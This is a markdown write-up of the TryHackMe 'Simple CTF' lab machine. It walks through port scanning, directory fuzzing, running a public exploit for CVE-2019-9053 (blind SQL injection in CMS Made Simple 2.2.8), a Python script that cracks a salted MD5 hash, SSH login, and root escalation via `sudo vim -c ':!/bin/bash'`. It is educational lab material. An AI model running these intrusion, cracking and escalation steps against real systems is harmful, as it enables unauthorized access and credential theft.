@@ -1,0 +1,281 @@
+---
+title: 'Simple CTF'
+description: 'Exploiting a time-based blind SQL injection in CMS Made Simple, cracking a salted MD5 hash and escalating via sudo.'
+publishDate: 2026-09-03
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+  - privesc
+---
+
+**Difficulty:** Easy **Category:** Web enumeration (CMS Made Simple), exploiting a known CVE (time-based blind SQL injection), cracking a salted MD5 hash, privilege escalation via `vim` (misconfigured sudoers / GTFOBins) **Room:** [https://tryhackme.com/room/simplectf](https://tryhackme.com/room/simplectf)
+
+> **Note on the name:** this room’s real name on TryHackMe is **“Simple CTF”**; it is corrected here from an earlier transcription (“Sample CTF”), probably a typo when transcribing the name.
+
+## Room description
+
+A Linux machine very popular among beginners that introduces the full flow of identifying the exact web technology a site runs (CMS Made Simple, specific version), finding and applying a public exploit for a known vulnerability (**CVE-2019-9053**, a time-based blind SQL injection), cracking a **salted** MD5 hash, accessing over SSH on a non-standard port, and escalating privileges by abusing an unrestricted `sudo` permission on `vim`.
+
+> **Note on placeholders:** `{IP}` / `target` stands for the IP TryHackMe assigns (it changes on every deploy). The other values (user `mitch`, salt, hash, password, SSH port) are fixed on this machine.
+
+---
+
+## 1. Environment setup
+
+```bash
+mkdir -p simple_ctf/{scans,content,scripts,loot,exploits} && cd simple_ctf
+settarget {IP}
+```
+
+---
+
+## 2. Port scan
+
+```bash
+sudo nmap -p- --open -T4 -v -n target -oG scans/allports
+extractPorts scans/allports
+```
+
+- `-p- --open`: scans all TCP ports and shows only the open ones.
+- `-T4`: aggressive timing.
+- `-v -n`: verbose, no DNS resolution.
+- `-oG`: “grepable” output for `extractPorts`.
+
+**Expected ports:**
+
+| Port     | Service                                                                       |
+| -------- | ----------------------------------------------------------------------------- |
+| 21/tcp   | FTP (anonymous login allowed, but no useful content relevant to this machine) |
+| 80/tcp   | HTTP                                                                          |
+| 2222/tcp | SSH (**non-standard** port, an important detail for later access)             |
+
+A second version scan over the found ports is worthwhile:
+
+```bash
+nmap -sV -sC -p21,80,2222 {IP} -oN scans/detailed-scan
+```
+
+---
+
+## 3. Web enumeration and hidden directory
+
+Visiting `http://{IP}/` shows only the default Apache page, with no obvious content. We proceed with directory fuzzing:
+
+```bash
+gobuster dir -u http://target/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,bak -t 30
+```
+
+- `-x php,html,txt,bak`: tries these extensions in addition to directory names.
+- `-t 30`: 30 concurrent threads.
+
+**Relevant result:**
+
+```
+/simple (Status: 301)
+```
+
+Visiting `http://{IP}/simple/` loads a **CMS Made Simple** installation, with a sample post signed by a user named **`mitch`** — the username that reappears later as a real system account.
+
+---
+
+## 4. Version identification and CVE lookup
+
+Reviewing the page source, the CMS metadata, or its admin page (`/simple/admin/login.php`, which in old versions can leak the version in the footer), the exact version is identified: **CMS Made Simple 2.2.8**.
+
+With the version confirmed, we search vulnerability databases:
+
+```bash
+searchsploit cms made simple
+```
+
+**Result:** any version of CMS Made Simple **earlier than 2.2.10** is vulnerable to **CVE-2019-9053**, an unauthenticated **time-based blind SQL injection (SQLi)** vulnerability in the CMS’s “News” module, which allows extracting arbitrary information from the database (including user credentials) without being authenticated.
+
+---
+
+## 5. Exploitation (CVE-2019-9053)
+
+### 5.1 Get the exploit
+
+```bash
+git clone https://github.com/e-renna/CVE-2019-9053
+cd CVE-2019-9053
+```
+
+> Note: there are several public copies/forks of this same exploit (for example, also available directly via `searchsploit -m php/webapps/46635.py`, its original Exploit-DB identifier). They all implement the same time-based blind SQL injection technique, with small syntax variations between Python 2 and Python 3 versions.
+
+### 5.2 How the vulnerability works (technical summary)
+
+The exploit script sends HTTP requests with malicious SQL parameters to the CMS’s news module, taking advantage of the application not correctly sanitising certain parameters before including them in SQL queries. Since it is a **time-based blind** injection, the exploit does not receive the data directly in the HTTP response; instead, it builds conditional queries of the type _“if the first character of the hash is 'a', sleep 5 seconds”_, and measures the server’s response time to infer, character by character, the real content of the database tables (username, password salt, password hash, email) — a process automated by the script, but which in practice can take several minutes to complete.
+
+### 5.3 Run the exploit
+
+```bash
+python3 exploit.py -u http://target/simple -w /usr/share/wordlists/rockyou.txt
+```
+
+- `-u`: base URL of the vulnerable CMS Made Simple installation.
+- `-w`: wordlist to use if the script also includes automatic cracking of the extracted password (depending on the exploit version, this parameter may be called `-w` or require the additional flag `--crack`/`-c`).
+
+**Data extracted by the exploit:**
+
+```
+Salt: 1dac0d92e9fa6bb2
+User: mitch
+Email: admin@admin.com
+Password hash: 0c01f4468bd75d7a84c7eb73846e8d96
+```
+
+---
+
+## 6. Manual cracking of the salted hash
+
+In case the script itself fails to crack the password automatically (for example, if `rockyou.txt` is not indexed as expected, or if you prefer to do it independently to confirm the result), it can be cracked manually, since CMS Made Simple uses a simple hash scheme: **MD5(salt + password)**.
+
+```bash
+cat > crack.py << 'EOF'
+import hashlib
+salt = "1dac0d92e9fa6bb2"
+target_hash = "0c01f4468bd75d7a84c7eb73846e8d96"
+with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
+    for line in f:
+        word = line.strip()
+        if hashlib.md5((salt + word).encode("utf-8")).hexdigest() == target_hash:
+            print(f"[+] Password found: {word}")
+            break
+    else:
+        print("[-] Not found in the wordlist")
+EOF
+python3 crack.py
+```
+
+Script breakdown:
+
+- `salt + word`: reconstructs the same operation the CMS does internally when validating passwords — it concatenates the salt **before** the candidate password (order matters: if the CMS concatenated `word + salt`, the resulting hash would be completely different).
+- `encoding="latin-1"`: this encoding is used (instead of the default UTF-8) when reading `rockyou.txt`, since that wordlist contains bytes that are not valid UTF-8 on some lines (passwords with characters from other languages/encodings); `latin-1` can decode any byte sequence without raising errors, preventing the script from stopping midway through the wordlist.
+- `hashlib.md5(...).hexdigest()`: computes the MD5 hash of the `salt+word` concatenation and compares it against the target hash.
+
+**Password found:**
+
+```
+user: mitch
+password: secret
+```
+
+---
+
+## 7. User flag — SSH access
+
+Recalling that the initial scan revealed SSH on port **2222** (not the standard 22):
+
+```bash
+ssh mitch@target -p 2222
+# password: secret
+```
+
+```bash
+cat user.txt
+```
+
+**Result:**
+
+```
+G00d j0b, keep up!
+```
+
+### 7.1 Stabilise the shell (recommended)
+
+```bash
+python3 -c "import pty; pty.spawn('/bin/bash')"
+```
+
+### 7.2 Further enumeration (system users)
+
+```bash
+cd /home
+ls
+```
+
+Besides `mitch`, another home directory is discovered:
+
+```
+sunbath
+```
+
+(This additional user is not needed to complete the final privilege escalation, but it is part of the room’s usual questions as an enumeration exercise.)
+
+---
+
+## 8. Privilege escalation
+
+### 8.1 Enumerating sudo permissions
+
+```bash
+sudo -l
+```
+
+Expected output:
+
+```
+User mitch may run the following commands on machine:
+    (root) NOPASSWD: /usr/bin/vim
+```
+
+This indicates `mitch` can run **`vim`** as root, **without a password**.
+
+### 8.2 Why this allows privilege escalation
+
+`vim` (like many advanced text editors) allows running shell commands directly from its interface, through the `!` prefix in command mode (`:!command`). If `vim` is running with root privileges (thanks to the unrestricted `sudo` permission), any command launched this way **inherits those same privileges** — a technique documented in **GTFOBins** ([https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/)), the same family of technique already seen with `vi` on the Chocolate Factory machine.
+
+### 8.3 Exploitation
+
+```bash
+sudo vim -c ':!/bin/bash'
+```
+
+- `-c ':!/bin/bash'`: tells `vim`, right as it opens, to run the command `:!/bin/bash` directly (equivalent to opening `vim` normally and then manually typing `:!/bin/bash` + Enter, but in a single step from the command line).
+
+This launches a Bash shell, inheriting the root privileges `vim` is running with:
+
+```bash
+id
+# uid=0(root) gid=1000(mitch) groups=1000(mitch)
+```
+
+> An equally valid alternative documented in GTFOBins: `sudo vim -c ':!sh'`, or directly `sudo vim /root/root.txt` if the goal is only to **read** the flag file without needing a full interactive shell.
+
+### 8.4 Root flag
+
+```bash
+cat /root/root.txt
+```
+
+---
+
+## 9. Attack chain summary
+
+1. **Recon** with `nmap` → FTP (21), HTTP (80), SSH on a non-standard port (2222).
+2. **Web fuzzing** with `gobuster` → discover `/simple`, a **CMS Made Simple 2.2.8** installation.
+3. **Lookup of the CVE** for that version → **CVE-2019-9053** (time-based blind SQLi).
+4. **Exploitation** with the public script → extraction of user (`mitch`), salt and password hash.
+5. **Cracking the salted hash** (MD5(salt+password)) against `rockyou.txt` → password `secret`.
+6. **SSH access** on port 2222 with `mitch:secret` → user flag.
+7. **sudo enumeration** (`sudo -l`) → unrestricted permission on `/usr/bin/vim`.
+8. **Exploitation via GTFOBins** (`sudo vim -c ':!/bin/bash'`) → root shell.
+9. Final **root flag**.
+
+## 10. Lessons learned / key concepts
+
+- **Identifying the exact version of a CMS/software is the most decisive step** on this kind of machine: without knowing it was specifically CMS Made Simple 2.2.8, there would be no way to find the corresponding CVE.
+- **Time-based blind SQLi** is an exploitation technique that does not rely on seeing the extracted data directly in the HTTP response, but on measuring **how long the server takes to respond** to conditional queries — slower than a “classic” SQLi with visible output, but just as effective and automatable.
+- **`MD5(salt + password)` is a weak hash scheme** compared to modern standards (bcrypt, Argon2, scrypt): although the salt prevents direct use of generic rainbow tables, it is still trivial to attack by brute force/dictionary once the salt is known (which here is leaked by the SQLi itself), since MD5 is extremely fast to compute.
+- **Non-standard SSH ports** (like this machine’s 2222) are a “security through obscurity” measure that a full port scan (`-p-`) always reveals; never assume SSH is “unavailable” just because you do not see it on port 22.
+- **`vim` (and its `vi` variant) with unrestricted `sudo` permissions** is, once again, equivalent to a full root shell — the same pattern already seen on the “Chocolate Factory” machine, reinforcing the importance of always checking GTFOBins for **any** binary listed in `sudo -l`, not just the “obviously dangerous” ones like `bash` or `python`.
+
+## 11. Tools used
+
+`nmap`, `gobuster`, a browser (CMS identification), `searchsploit`, a public Python exploit (CVE-2019-9053), `hashlib` (Python, manual cracking of the salted hash), the `ssh` client, `sudo`, `vim` (abused via GTFOBins).
+
+---
+
+_Academic write-up, built from my own notes solving the “Simple CTF” machine on TryHackMe, supplemented with public community write-ups to explain in detail the time-based blind SQLi mechanism of CVE-2019-9053 and confirm the privilege-escalation vector documented in GTFOBins._
